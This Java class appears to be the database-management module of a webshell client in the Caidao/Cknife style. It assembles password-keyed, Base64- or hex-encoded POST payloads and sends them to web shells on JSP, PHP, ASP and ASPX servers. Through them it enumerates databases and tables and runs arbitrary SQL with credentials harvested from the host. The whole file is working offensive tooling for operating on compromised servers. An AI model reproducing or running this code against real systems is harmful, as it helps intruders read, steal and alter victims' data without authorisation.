package com.ms509.util;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.UnsupportedCharsetException;

import javax.swing.JTree;

import sun.misc.BASE64Encoder;

public class DataBase {

	private static String dbtype;
	private static String dbhost;
	private static String dbuser;
	private static String dbpass;
	private static String dbcode;
	private static String dbmaster;
	private static String sp;
	private static String p1;
	private static String params;

	public DataBase() {
		// TODO Auto-generated constructor stub
	}

	// 初始化配置文件
	private static void init(String config,int type) {
		dbtype = config.substring(config.indexOf("<T>") + 3, config.indexOf("</T>"));
//		System.out.println("dbtype" + dbtype);
		switch(type)
		{
		case 0://jsp
			if (dbtype.equals("MYSQL") || dbtype.equals("ORACLE")) {
				dbhost = config.substring(config.indexOf("<H>") + 3, config.indexOf("</H>"));
				
				dbuser = config.substring(config.indexOf("<U>") + 3, config.indexOf("</U>"));
				dbpass = config.substring(config.indexOf("<P>") + 3, config.indexOf("</P>"));
				dbcode = config.substring(config.indexOf("<L>") + 3, config.indexOf("</L>"));
				if (config.indexOf("<M>") > 0) {
					dbmaster = config.substring(config.indexOf("<M>") + 3, config.indexOf("</M>"));
				} else {
					dbmaster = "";
				}

			}
			if(dbtype.equals("MSSQL"))
			{
				dbhost = config.substring(config.indexOf("<H>") + 3, config.indexOf("</H>"));
				dbuser = config.substring(config.indexOf("<U>") + 3, config.indexOf("</U>"));
				dbpass = config.substring(config.indexOf("<P>") + 3, config.indexOf("</P>"));
				dbcode = config.substring(config.indexOf("<L>") + 3, config.indexOf("</L>"));
				if (config.indexOf("<M>") > 0) {
					dbmaster = config.substring(config.indexOf("<M>") + 3, config.indexOf("</M>"));
				} else {
					dbmaster = "";
				}
			}
			break;
		case 1://php
			if (dbtype.equals("MYSQL")) {
				dbhost = config.substring(config.indexOf("<H>") + 3, config.indexOf("</H>"));
				dbuser = config.substring(config.indexOf("<U>") + 3, config.indexOf("</U>"));
				dbpass = config.substring(config.indexOf("<P>") + 3, config.indexOf("</P>"));
				dbcode = config.substring(config.indexOf("<L>") + 3, config.indexOf("</L>"));
				if (config.indexOf("<M>") > 0) {
					dbmaster = config.substring(config.indexOf("<M>") + 3, config.indexOf("<M>"));
				} else {
					dbmaster = "";
				}

			} else if (dbtype.equals("MDB") || dbtype.equals("MSSQL")) {
				dbhost = config.substring(config.indexOf("<C>") + 3, config.indexOf("</C>"));
//				System.out.println("db=" + dbhost);
			}
			break;
		case 2://asp
			dbhost = config.substring(config.indexOf("<C>") + 3, config.indexOf("</C>"));
			break;
		case 3://aspx
				dbhost = config.substring(config.indexOf("<C>") + 3, config.indexOf("</C>"));
			break;
		}
			
	}

	// 获取数据库库名
	public static String[] getDBs(String url, String pass, String config, int type, String code) {
		init(config ,type);
		String[] result = null;
		String rs = null;
		switch (type) {
		case 0: // JSP
			// 先不考虑jsp base64 编码
			if (dbtype.equals("MYSQL")) {
				p1 = Safe.JSP_DB_MYSQL;
			} else if (dbtype.equals("MSSQL")) {
				p1 = Safe.JSP_DB_MSSQL;
			} else if (dbtype.equals("ORACLE")) {
				// oracle
				p1 = Safe.JSP_DB_ORACLE;
			}
//			System.out.println("test");
			p1 = p1.replace("localhost", dbhost).replace("testdb", dbmaster).replace("username", dbuser)
					.replace("userpwd", dbpass);
			params = pass + "=" + Safe.JSP_MAKE + "&" + Safe.CODE + "=" + dbcode + "&" + Safe.ACTION + "=N" + "&z1="
					+ p1 + "&z2=&z3=";
//			System.out.println("params=" + params);
			rs = Common.send(url, params, code);
//			System.out.println(rs);
			break; 
		case 1: //php
			if (Safe.PHP_BASE64.equals("1")) {
//				System.out.println("use base 64");
				String payload = "";
				try {
					BASE64Encoder encode = new BASE64Encoder();

					payload = encode.encode(Safe.PHP_DB_MYSQL.getBytes(code));
					payload = URLEncoder.encode(payload);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				sp = "choraheiheihei";
				String p1 = dbhost + sp + dbuser + sp + dbpass;
				String params = pass + "=" + Safe.PHP_MAKE + "&" + Safe.ACTION + "=" + payload + "&z1=" + p1
						+ "&z2=&z3=";
//				System.out.println(params);
				rs = Common.send(url, params, code);
//				System.out.println(rs);
			}else{
				
			}
			break; // 
		case 2:   //asp    //读取库名时实际并未连接数据库
			if (dbtype.equals("MDB")) {
				String dbname = dbhost.substring(dbhost.indexOf("Data Source=") + 12, dbhost.length());
				System.out.println(dbname);
				rs = "\t|\t\r\n" + dbname;
				// getTables(url,pass,config,type,code,"");
			} else if(dbtype.equals("MYSQL"))
			{
				String dname = "";
				dname = dbhost.substring(dbhost.indexOf("database=")+9, dbhost.length());
				dname = dname.substring(0, dname.indexOf(";"));
				rs = exec_sql(url, pass, config, type, code, "show databases;", dname);
			}
			else {
				rs = "\t|\t\r\n[ado database]";
				// getTables(url,pass,config,type,code,"");
			}

			break; // 
		case 3:   //aspx 问题同asp
			System.out.println("aspx");
			// ASPX base64 编码
			if (dbtype.equals("MDB")) {
				String dbname = dbhost.substring(dbhost.indexOf("Data Source=") + 12, dbhost.indexOf("mdb") + 3);
				System.out.println(dbname);
				getTables(url, pass, config, type, code, "");
				rs = "\t|\t\r\n" + dbname;
			} else if(dbtype.equals("MYSQL"))
			{
				String dname = "";
				dname = dbhost.substring(dbhost.indexOf("database=")+9, dbhost.length());
				dname = dname.substring(0, dname.indexOf(";"));
				rs = exec_sql(url, pass, config, type, code, "show databases;", dname);
			}else {
				rs = "\t|\t\r\n[ado database]";
				getTables(url, pass, config, type, code, "");
			}
			break; // aspx
		}
		result = rs.split("\t\\|\t\r\n");
		return result;
	}

	// 获取数据库表明
	public static String getTables(String url, String pass, String config, int type, String code, String dbn) {
		// String result = null;
		String s = "show tables from " + dbn;
		String result = "";
		switch(type)
		{
		case 0: //jsp
			if (dbtype.equals("MDB") ) {
				result = exec_sql(url, pass, config, type, code, "", dbn);
			}
			else if(dbtype.equals("ORACLE")|| dbtype.equals("MSSQL")){
				result = exec_sql(url, pass, config, type, code, "get_tables", dbn);
			}else
			{
				result = exec_sql(url, pass, config, type, code, s, dbn);
			}
			break;
		case 1://php
			if (dbtype.equals("MDB") || dbtype.equals("MSSQL")) {
				result = exec_sql(url, pass, config, type, code, "", dbn);
			} else {
				result = exec_sql(url, pass, config, type, code, s, dbn);
			}
			break;
		case 2://asp
			result = exec_sql(url, pass, config, type, code, "", dbn);
			break;
		case 3://aspx
			if (dbtype.equals("MDB") || dbtype.equals("MSSQL")) {
				result = exec_sql(url, pass, config, type, code, "", dbn);
			} else {
				result = exec_sql(url, pass, config, type, code, s, dbn);
			}
			break;
		}
		return result;
	}

	// 执行sql语句
	public static String exec_sql(String url, String pass, String config, int type, String code, String sql,
			String dbn) {
		// System.out.print("config="+config);
		init(config,type);
		String dbsql = "";
		String result = "";
		switch (type) {
		case 0:
//			System.out.println("jsp");
			String action = "Q";
			if(dbtype.equals("MYSQL"))
			{
				p1 = Safe.JSP_DB_MYSQL;
				p1 = p1.replace("localhost", dbhost).replace("testdb", dbn).replace("username", dbuser).replace("userpwd",
						dbpass);
				
			}else if(dbtype.equals("MSSQL"))
			{
				if(sql.equals("get_tables"))
				{
					action = "O";
				}
				p1 = Safe.JSP_DB_MSSQL;
				p1 = p1.replace("localhost", dbhost).replace("testdb", dbn).replace("username", dbuser).replace("userpwd",
						dbpass);
//				System.out.println(p1);
			}else if(dbtype.equals("ORACLE"))
			{
				if(sql.equals("get_tables"))
				{
					action = "O";
				}
				p1 = Safe.JSP_DB_ORACLE;
				p1 = p1.replace("localhost", dbhost).replace("testdb", dbmaster).replace("username", dbuser).replace("userpwd",
						dbpass);
				//ORACLE 支持
			}
		//	p1 = p1.replace("localhost", dbhost).replace("testdb", dbn).replace("username", dbuser).replace("userpwd",dbpass);
//			System.out.println("p1="+p1);
//			System.out.println("dbn="+dbn);
			sp = "choraheiheihei";
			params = pass + "=" + Safe.JSP_MAKE + "&" + Safe.CODE + "=" + dbcode + "&" + Safe.ACTION + "="+action + "&z1="
					+ p1 + sp +dbn+"&z2=" + sql + "&z3=";
//			System.out.println("params=" + params);
			result = Common.send(url, params, code);
			break; // jsp
		case 1: // 还需区分数据库类型  php 暂只有mysql
			if (Safe.PHP_BASE64.equals("1")) {
//				System.out.println("use base 64");
				String payload = "";
				try {
					BASE64Encoder encode = new BASE64Encoder();

					payload = encode.encode(Safe.PHP_DB_MYSQL.getBytes(code));
					payload = URLEncoder.encode(payload);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					BASE64Encoder encode = new BASE64Encoder();

					dbsql = encode.encode(sql.getBytes(code));
					dbsql = URLEncoder.encode(dbsql);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				sp= "choraheiheihei";
				String p1 = dbhost + sp + dbuser + sp + dbpass;
				String params = pass + "=" + Safe.PHP_MAKE + "&" + Safe.ACTION + "=" + payload + "&z1=" + p1 + "&z2="
						+ dbn + "&z3=" + dbsql;
//				System.out.println("params="+params);
				result = Common.send(url, params, code);
				// System.out.println(rs);
			}
			break; // php
		case 2:   //asp
//			System.out.println("asp1");
//			System.out.println("p1=" + dbhost + "\n");
			p1 = dbhost;
			try {
				BASE64Encoder encode = new BASE64Encoder();

				p1 = toHexString(p1);
				p1 = URLEncoder.encode(p1);
				sql = toHexString(sql);
				sql = URLEncoder.encode(sql);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
//			System.out.println("dbtype" + dbtype);
			if (dbtype.equals("MDB")) {
				params = pass + "=" + Safe.ASP_DB_MDB + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			} else if (dbhost.indexOf("SQLOLEDB.1") > 0) {
				params = pass + "=" + Safe.ASP_DB_MSSQL + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			} else if (dbtype.equals("MYSQL"))
			{
				params = pass + "=" + Safe.ASP_DB_MSSQL + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			}
//			System.out.println("params=" + params);
			result = Common.send(url, params, code);
			break; // asp
		case 3: //aspx
//			System.out.println("aspx");
//			System.out.println("D=" + dbhost);
//			System.out.println(dbhost.indexOf("mdb"));

			p1 = dbhost;
//			System.out.println("p1=" + dbhost + "\n");
			try {
				BASE64Encoder encode = new BASE64Encoder();

				p1 = encode.encode(p1.getBytes(code));
				p1 = URLEncoder.encode(p1);
				sql = encode.encode(sql.getBytes(code));
				sql = URLEncoder.encode(sql);
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if (dbtype.equals("MDB")) {
				params = pass + "=" + Safe.ASPX_DB_MDB + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			} else if (dbtype.equals("MSSQL")) {
				params = pass + "=" + Safe.ASPX_DB_MSSQL + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			}else if (dbtype.equals("MYSQL")) {
				params = pass + "=" + Safe.ASPX_DB_MYSQL + "&z1=" + p1 + "&z2=" + sql + "&z3=";
			}
			
//			System.out.println("params=" + params);
			result = Common.send(url, params, code);

			break; // aspx
		}
		return result;
	}

	
	public static String[] Load_SQL()
	{
		String k = Safe.COMMON_SQL_STRING;
		String[] sqls = k.split("\\|\\|\\|");
		for(int a =0;a<sqls.length;a++)
		{
//			System.out.println(sqls[a]);
		}
		return sqls;
	}
	
	// 16进制 转换
	private static String toHexString(String s) {
		String str = "";
		try {
			byte[] b = s.getBytes();
			// String k = new String(b,"GBK");
			// byte[] b = k.getBytes();
			// String str = " ";
			for (int i = 0; i < b.length; i++) {
				Integer I = new Integer(b[i]);
				String strTmp = I.toHexString(b[i]);
				// System.out.println(strTmp.length());
				if (strTmp.length() > 2)
					strTmp = strTmp.substring(strTmp.length() - 2);
				str = str + strTmp;
			}
			// System.out.println(str.toUpperCase());
		} catch (Exception e) {
			e.printStackTrace();
		}
		return str;
	}
}
